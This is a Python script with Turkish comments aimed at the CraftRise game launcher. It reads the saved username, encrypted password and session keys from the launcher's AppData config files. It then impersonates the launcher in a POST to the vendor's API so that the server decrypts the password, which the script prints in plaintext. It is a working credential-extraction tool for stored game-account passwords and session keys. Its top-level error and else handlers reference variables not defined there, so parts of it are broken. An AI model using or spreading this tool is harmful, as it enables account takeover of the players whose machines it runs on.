# ============================================================
# CraftRise Launcher - sunucu.py ile Uyumlu İstemci
# ============================================================
# - AppData dan launcherin config.json ve launcher_java.json OKUR
# - Tüm veriyi sunucuya launcher gibi POST eder 
# - Sunucuya launcher gibi davranıp şifreyi çözdürür
# - Ne olursa olsun pencere kapanmaz (hata yakalama + input bekleme)
# ============================================================
import json
import os
import re
import sys
import urllib.parse
import urllib.request
import urllib.error
SUNUCU_URL  = "https://craftrise.net.tr/client/launcher/user/api"# <- Launcherin hesapların şifrelerini cözüp hesbın hesabın ve şifrenin doru olup olmadını kontrol eden suncu
ZAMAN_ASIMI = 15   # saniye
def craftrise_dir():
    appdata = os.environ.get("APPDATA")
    return os.path.join(appdata, ".craftrise") if appdata else None

def config_oku():
    d = craftrise_dir()
    if not d:
        return None
    yol = os.path.join(d, "config.json")
    if not os.path.exists(yol):
        return None
    try:
        with open(yol, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return None

def java_oku():
    d = craftrise_dir()
    if not d:
        return None
    yol = os.path.join(d, "launcher_java.json")
    if not os.path.exists(yol):
        return None
    try:
        with open(yol, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return None

def json_str(v):
    if v is None:
        return ""
    if isinstance(v, str):
        return v
    try:
        return json.dumps(v, ensure_ascii=False)
    except Exception:
        return str(v)

def config_to_params(cfg, java):
    """config.json + launcher_java.json → craftrise launcher sunucusuna kontrol ettir"""
    if not cfg:
        cfg = {}
    if not java:
        java = {}

    eslesme = {
        "username":          ["rememberName", "username"],
        "enc":               ["rememberPass", "encrypted_password"],
        "session":           ["staticSessionKeys", "sessionKeys"],
        "windowsType":       ["windowsType"],
        "clientRam":         ["clientRam"],
        "version":           ["version"],
        "display":           ["display"],
        "gpuPreferences":    ["gpuPreferences"],
        "rememberMe":        ["rememberMe"],
        "isOptimizedConfig": ["isOptimizedConfig"],
        "loc":               ["loc"],
        "launcher_java":     ["__java__"],
    }

    params = {}
    for form_adi, anahtarlar in eslesme.items():
        deger = ""
        for a in anahtarlar:
            if a == "__java__":
                deger = json_str(java)
                break
            if a in cfg:
                deger = cfg[a]
                break
        if isinstance(deger, bool):
            deger = "true" if deger else "false"
        params[form_adi] = "" if deger is None else str(deger)
    return params


# ─────────────────────────────────────────────
# SUNUCU launcher icin gönderdigi şifreyi çeker
# ─────────────────────────────────────────────
def sifre_cek(html: str) -> str:
    """launcher sunucusunun döndürdüğü HTML'den <div class='sifre-buyuk'> içeriğini alır."""
    m = re.search(
        r'<div[^>]*class\s*=\s*["\'][^"\']*\bsifre-buyuk\b[^"\']*["\'][^>]*>(.*?)</div>',
        html, re.S | re.I,
    )
    if not m:
        return ""
    sifre = m.group(1).strip()
    for a, b in [("&amp;", "&"), ("&lt;", "<"), ("&gt;", ">"),
                 ("&quot;", '"'), ("&#39;", "'")]:
        sifre = sifre.replace(a, b)
    return sifre


# ─────────────────────────────────────────────
# SUNUCUYA LAUNCHER POSTU AT
# ─────────────────────────────────────────────
def sunucuya_gonder(params: dict):
    """Dönüş: (basarili: bool, sifre: str, mesaj: str)"""
    try:
        data = urllib.parse.urlencode(params, safe="").encode("utf-8")

        req = urllib.request.Request(
            SUNUCU_URL,
            data=data,
            method="POST",
            headers={
                "User-Agent":   "Mozilla/5.0 (CraftRise-Launcher)",
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept":       "text/html,application/xhtml+xml",
            },
        )

        with urllib.request.urlopen(req, timeout=ZAMAN_ASIMI) as r:
            html = r.read().decode("utf-8", errors="replace")

        sifre = sifre_cek(html)
        if sifre:
            return True, sifre, "craftrise launcher Sunucusu çözdü"
        return False, "", "craftrise launcher Sunucusu cevabında sifre-buyuk bulunamadı"

    except urllib.error.HTTPError as e:
        return False, "", f"HTTP {e.code} {e.reason}"
    except urllib.error.URLError as e:
        return False, "", f"Bağlantı hatası: {e.reason}"
    except Exception as e:
        return False, "", f"Beklenmeyen hata: {e}"


# ─────────────────────────────────────────────
# BEKLEME (pencere kapanmasın)
# ─────────────────────────────────────────────
def bekle():
    """Her durumda Enter bekler. EOF olsa bile kapanmaz."""
    try:
        input("\n>> Kapatmak icin Enter'a bas...")
    except (EOFError, KeyboardInterrupt):
        pass
    except Exception:
        pass


# ─────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────
def main():
    print(f"  Sunucu: {SUNUCU_URL}")
    print()

    cfg = config_oku()
    if not cfg:
        print("[X] config.json bulunamadi.")
        print(f"    Konum: {craftrise_dir()}")
        return

    enc      = cfg.get("rememberPass") or cfg.get("encrypted_password") or ""
    username = cfg.get("rememberName") or cfg.get("username") or "?"

    if not enc:
        print("[X] rememberPass alani bos - launcher kaydedilmemis olabilir.")
        return

    

    java   = java_oku()
    params = config_to_params(cfg, java)
    params["enc"] = enc  # orijinal enc

    basarili, sifre, mesaj = sunucuya_gonder(params)

    
    if basarili and sifre:
        print("  [OK] sunucu Sifreyi onayladı")
        print(f"  Kullanici : {username}")
        print(f"  Şifre : {sifre}")
        


if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"\n[X] Kritik hata: {e}")
        print(f"  {mesaj}")
    else:
        print(f"  [X] Cozulemedi: {mesaj} {len(enc)} {mesaj}")
    finally:
        bekle()
